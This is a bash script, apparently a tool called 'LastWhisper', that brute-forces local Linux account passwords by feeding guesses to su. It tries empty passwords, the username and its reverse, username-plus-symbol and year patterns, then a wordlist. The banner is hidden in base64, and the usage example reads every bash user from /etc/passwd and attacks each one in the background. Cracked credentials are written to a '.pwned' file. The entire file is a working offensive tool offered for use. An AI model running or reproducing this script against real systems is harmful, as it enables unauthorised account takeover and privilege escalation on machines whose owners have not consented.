#!/bin/bash

export PATH="/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:$PWD:$PATH"

help="
$(printf ICAgICAgICAgICAgICBfLW8jJiYqJycnJz9kOj5iXF8KICAgICAgICAgIF9vLyJgJycgICcnLCwgZE1GOU1NTU1NSG9fCiAgICAgICAubyYjJyAgICAgICAgYCJNYkhNTU1NTU1NTU1NTUhvLgogICAgIC5vIiIgJyAgICAgICAgIHZvZE0qJCYmSE1NTU1NTU1NTU0/LgogICAgLCcgICAgICAgICAgICAgICRNJm9vZCx+J2AoJiMjTU1NTU1NSFwKICAgLyAgICAgICAgICAgICAgICxNTU1NTU1NI2I/I2JvYk1NTU1ITU1NTAogICYgICAgICAgICAgICAgID9NTU1NTU1NTU1NTU1NTU1NTTdNTU0kUipIawogPyQuICAgICAgICAgICAgOk1NTU1NTU1NTU1NTU1NTU1NTU0vSE1NTXxgKkwKfCAgICAgICAgICAgICAgIHxNTU1NTU1NTU1NTU1NTU1NTU1NTWJNSCcgICBULAokSCM6ICAgICAgICAgICAgYCpNTU1NTU1NTU1NTU1NTU1NTU1NTWIjfScgIGA/Cl1NTUgjICAgICAgICAgICAgICIiKiIiIiIqI01NTU1NTU1NTU1NTU0nICAgIC0KTU1NTU1iXyAgICAgICAgICAgICAgICAgICB8TU1NTU1NTU1NTU1QJyAgICAgOgpITU1NTU1NTUhvICAgICAgICAgICAgICAgICBgTU1NTU1NTU1NVCAgICAgICAuCj9NTU1NTU1NTVAgICAgICAgICAgICAgICAgICA5TU1NTU1NTU19ICAgICAgIC0KLT9NTU1NTU1NICAgICAgICAgICAgICAgICAgfE1NTU1NTU1NTT8sZC0gICAgJwogOnxNTU1NTU0tICAgICAgICAgICAgICAgICBgTU1NTU1NTVQgLk18LiAgIDoKICAuOU1NTVsgICAgICAgICAgICAgICAgICAgICZNTU1NTSonIGAnICAgIC4KICAgOjlNTWsgICAgICAgICAgICAgICAgICAgIGBNTU0jIiAgICAgICAgLQogICAgICZNfSAgICAgICAgICAgICAgICAgICAgIGAgICAgICAgICAgLi0KICAgICAgYCYuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuCQlMYXN0V2hpc3BlciB2MS4wIChodHRwczovL2dpdGh1Yi5jb20vbm93YWsweDAxL2xhc3R3aGlzcGVyKQogICAgICAgIGB+LCAgIC4gICAgICAgICAgICAgICAgICAgICAuLwogICAgICAgICAgICAuIF8gICAgICAgICAgICAgICAgICAuLQogICAgICAgICAgICAgICdgLS0uXyxkZCMjI3BwPSIiJwo=|base64 -d)

Usage:

:: $0 -u (user) -w (wordlist) -b (su-binarie) -t <timeout-seconds> -s <sleep-seconds> ::

Example
\t:: for _src in \$(grep bash /etc/passwd|cut -d':' -f1);do $0 -u \$_src -w ./passwords.txt -b /usr/bin/su -t 2 -s 0.008 & disown; done ::

"

if [ $# -ne 10 ];then
	printf "$help"
	exit 1
fi

while getopts "h?u:t:s:w:b:" opt;do
	case "$opt" in

		h|\?) printf "$help";;
		u) _user=$OPTARG;;
		t) _timeproc=$OPTARG;;
		s) _sleeproc=$OPTARG;;
		w) _wordlist=$OPTARG;;
		b) _binspath=$OPTARG;;
		*) exit 1;;
	esac
done

if ! [ -f "$_wordlist" ];then
	printf "\n:: wordlist: $_wordlist not found! ::\n"
	exit 1
elif ! [ -f "$_binspath" ];then
	printf "\n:: binarie: $_binspath not found! ::\n"
	exit 1
elif ! [ "`which timeout 2>&-`" ];then
	printf "\n:: timeout not found in $PATH ::\n"
	exit 1
fi

_init=`date +%s`

stdout()
{
	_user=$1
	_passwd=$2

	printf ":: username: $_user - password: $_passwd ::        \r\b"

	if [ $(printf "$_passwd" | timeout $_timeproc $_binspath "$_user" -c whoami 2>&-) ];then
		printf "
\e[7;38m[\$] user: $_user || password: $_passwd [\$]\e[0m
\$ total-time: $((`date +%s` - $_init)) seconds
" | tee -a "$_user.pwned"
		rm -f "$_user.pattern"
		kill -9 $$
	fi
}

main()
{
	printf "\n\e[4;37m[\$] Running on User: $_user [\$]\n\n\e[0m"
	_user=$1

	_array=(
'!' '@' '#' '\*' '+'
'!#' '#!' '@#' '#@' '#$' '&*' '*&'
'*(' '(*' '()' ')(' ')_' '_)' '(-' '-(' '-)' ')-'
'_+' '+_' '-+' '+-'
'@1994' '@1995' '@1996' '@1997' '@1998' '@1999'
'@2000' '@2001' '@2002' '@2003' '@2004' '@2005' '@2006' '@2007' '@2008' '@2009' '@2010' '@2011' '@2012' '@2013' '@2014' '@2015' '@2016' '@2017' '@2018' '@2019' '@2020' '@2021' '@2022' '@2023' '@2024' '@2025'
)

	stdout $_user '' &
	stdout $_user $_user &
	stdout $_user `printf $_user|rev 2>&-` &


	[ -f "$_user.pattern" ] && rm -f "$_user.pattern"
	for _pattern in ${_array[@]};do
		printf "\n$_user$_pattern" >> "$_user.pattern"
	done

	while IFS='' read -r X || [ -n "${X}" ];do
		stdout $_user $X &
		sleep $_sleeproc
	done < "$_user.pattern"

	rm -f "$_user.pattern"
	wait
	while IFS='' read -r P || [ -n "${P}" ];do
		stdout $_user $P &
		sleep $_sleeproc
	done < "$_wordlist"

	wait
}

main $_user
